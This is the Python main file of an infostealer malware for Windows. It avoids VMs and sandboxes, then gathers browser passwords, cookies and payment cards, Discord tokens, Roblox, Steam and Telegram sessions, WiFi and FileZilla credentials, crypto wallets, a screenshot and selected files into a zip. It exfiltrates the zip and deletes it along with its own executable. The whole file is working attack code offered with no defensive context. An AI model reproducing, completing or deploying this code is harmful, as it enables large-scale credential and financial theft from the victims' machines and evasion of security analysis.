# language: Python 3, file: main.py, target: Windows 10/11
# Orchestrador — corre todos los módulos en secuencia,
# empaqueta en zip, exfiltra, limpia rastros.

import os
import sys
import zipfile
import tempfile
import socket
import getpass
import platform
import time
from datetime import datetime

from Anti_VM_Debug    import is_vm_or_debugged
from anti_sandbox     import AntiSandbox
from anti_virus_infos import AntiVirus_Infos
from system_infos     import GetSystemInfos
from browser_steal    import BrowserSteal
from discord_token    import DiscordAccount
from roblox_cookies   import RobloxAccount
from interesting_files import InterestingFiles
from wallets          import WalletSteal
from screenshot       import Screenshot
from steam            import SteamSteal
from wifi_passwords   import WiFiPasswords
from telegram_session import TelegramSession
from filezilla        import FileZillaSteal
from exfil            import Exfil


def _should_bail() -> bool:
    try:
        if is_vm_or_debugged():
            return True
    except Exception:
        pass
    checks = [
        AntiSandbox.detect_dlls,
        AntiSandbox.detect_mac,
        AntiSandbox.detect_hardware,
        AntiSandbox.detect_boot_time,
        AntiSandbox.detect_wine,
    ]
    for check in checks:
        try:
            result = check()
            if isinstance(result, tuple):
                result = result[0]
            if result:
                return True
        except Exception:
            pass
    return False


def _build_summary() -> dict:
    try:
        return {
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "os":       platform.platform(),
            "time":     datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        }
    except Exception:
        return {"time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")}


def _cleanup(zip_path: str):
    try:
        os.remove(zip_path)
    except Exception:
        pass
    try:
        os.remove(os.path.abspath(sys.argv[0]))
    except Exception:
        pass


def main():
    if _should_bail():
        sys.exit(0)

    hostname  = socket.gethostname()
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    zip_path  = os.path.join(tempfile.gettempdir(), f"{hostname}_{timestamp}.zip")

    summary = _build_summary()

    with zipfile.ZipFile(zip_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:

        # screenshot inicial — lo primero, captura estado real
        try:
            Screenshot(zf, interval_seconds=0, max_count=1)
        except Exception:
            pass

        # sistema
        try:
            GetSystemInfos(zf)
        except Exception:
            pass

        try:
            AntiVirus_Infos(zf)
        except Exception:
            pass

        # browser
        try:
            n_ext, n_pwd, n_cook, n_hist, n_dl, n_cards, n_auto = BrowserSteal(zf)
            summary["passwords"] = str(n_pwd)
            summary["cookies"]   = str(n_cook)
            summary["autofill"]  = str(n_auto)
            summary["cards"]     = str(n_cards)
        except Exception:
            pass

        # discord
        try:
            n_disc = DiscordAccount(zf)
            summary["discord"] = str(n_disc)
        except Exception:
            pass

        # roblox
        try:
            n_roblox = RobloxAccount(zf)
            summary["roblox"] = str(n_roblox)
        except Exception:
            pass

        # telegram
        try:
            n_tg = TelegramSession(zf)
            summary["telegram"] = str(n_tg)
        except Exception:
            pass

        # steam
        try:
            n_steam = SteamSteal(zf)
            summary["steam"] = str(n_steam)
        except Exception:
            pass

        # wifi
        try:
            n_wifi = WiFiPasswords(zf)
            summary["wifi"] = str(n_wifi)
        except Exception:
            pass

        # filezilla / ftp
        try:
            n_ftp = FileZillaSteal(zf)
            summary["ftp"] = str(n_ftp)
        except Exception:
            pass

        # wallets locales
        try:
            wallets = WalletSteal(zf)
            if wallets:
                summary["wallets"] = ", ".join(wallets.keys())
        except Exception:
            pass

        # interesting files
        try:
            InterestingFiles(zf)
        except Exception:
            pass

    Exfil(zip_path, summary)
    _cleanup(zip_path)


if __name__ == "__main__":
    main()
